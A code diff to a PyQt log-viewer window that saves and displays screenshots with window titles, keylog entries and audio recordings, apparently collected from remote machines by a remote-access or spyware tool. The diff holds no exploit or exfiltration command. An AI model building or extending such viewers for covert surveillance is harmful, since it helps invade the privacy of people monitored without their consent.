@@ -218,7 +218,36 @@ class LogViewer(QWidget, logViewerUi):
                 screenshots=self.downloading_screenshots_count
             ))
 
-            # Add Screenshot Preview
+            self.screenshotsTable.setRowCount(self.downloading_screenshots_count)
+
+            # Generate File
+            path = os.path.join(self.screenshots_dir, data['payload']['datetime']+'.png')
+            if not os.path.exists(path):
+                with open(path, 'wb') as screenshot_file:
+                    screenshot_file.write(data['payload']['raw'])
+
+            # add screenshot preview
+            image = QImage(path)
+            pixmap = QPixmap.fromImage(image)
+            previews_dict = QLabel()
+            previews_dict.setPixmap(pixmap.scaled(200, 200, Qt.KeepAspectRatio))
+            previews_dict.setScaledContents(True)
+            self.screenshotsTable.setCellWidget(self.downloaded_screenshots-1, 0, previews_dict)
+
+            # add screenshot information
+            payload = '''
+            <p align="center"><font color="#e67e22">%s</font></p>
+            %s
+            ''' % (data['payload']['datetime'], data['payload']['window_title'])
+            infoText = QTextEdit()
+            infoText.setReadOnly(True)
+            infoText.setStyleSheet('background: #2c3e50;\nborder: 1px ridge;\nborder-color: #2c3e50;\nborder-top: none;\npadding: 3px;')
+            infoText.insertHtml(payload)
+            self.screenshotsTable.setCellWidget(self.downloaded_screenshots-1, 1, infoText)
+
+            # add path
+            item = QTableWidgetItem(path)
+            self.screenshotsTable.setItem(self.downloaded_screenshots-1, 2, item)
 
         elif type == 'keylog':
             self.downloaded_keylogs += 1
@@ -228,13 +257,11 @@ class LogViewer(QWidget, logViewerUi):
                 keylogs=self.downloading_keylogs_count
             ))
 
-            # Add Keylog Preview
             self.keylogsTable.setRowCount(self.downloading_keylogs_count-1)
-            # add date
+            # Add Data
             item = QTableWidgetItem(data['payload']['datetime'])
             item.setTextColor(QColor('#f39c12'))
             self.keylogsTable.setItem(self.downloaded_keylogs-1, 0, item)
-
 
         elif type == 'audio':
             self.downloaded_audios += 1
@@ -244,23 +271,38 @@ class LogViewer(QWidget, logViewerUi):
                 audios=self.downloading_audios_count
             ))
 
-            # Add Audio Preview
-            self.audioTable.setRowCount(self.downloading_audios_count-1)
-
+            # Generate File
             path = os.path.join(self.audios_dir, data['payload']['datetime']+'.wav')
             if not os.path.exists(path):
                 with open(path, 'wb') as audio_file:
                     audio_file.write(data['payload']['raw'])
+
+            self.audioTable.setRowCount(self.downloading_audios_count-1)
+
+            # Add Audio Duration
+            item = QTableWidgetItem(audio_duration(path))
+            item.setTextAlignment(Qt.AlignHCenter | Qt.AlignVCenter)
+            item.setTextColor(QColor('#16a085'))
+            self.audioTable.setItem(self.downloaded_audios-1, 0, item)
+
             # Add Spectrum
-            generated_spectrum = spectrum_analyzer_image(self.audio_dict[key]['path'],
-                                                         self.audio_dict[key]['datetime'],
-                                                         self.selected_dir)
+            generated_spectrum = spectrum_analyzer_image(path, data['payload']['datetime'], self.spectrums_dir)
             image = QImage(generated_spectrum)
             pixmap = QPixmap.fromImage(image)
             spectrum_image = QLabel()
             spectrum_image.setStyleSheet('background: none;')
             spectrum_image.setPixmap(pixmap)
-            self.audioTable.setCellWidget(self.downloaded_keylogs-1, 1, spectrum_image)
+            self.audioTable.setCellWidget(self.downloaded_audios-1, 1, spectrum_image)
+
+            # add date time
+            item = QTableWidgetItem(data['payload']['datetime'])
+            item.setTextAlignment(Qt.AlignRight | Qt.AlignVCenter)
+            item.setTextColor(QColor('#f39c12'))
+            self.audioTable.setItem(self.downloaded_audios-1, 2, item)
+
+            # add path
+            item = QTableWidgetItem(path)
+            self.audioTable.setItem(self.downloaded_audios-1, 3, item)
 
         else:
             # Prepar Progress Bar
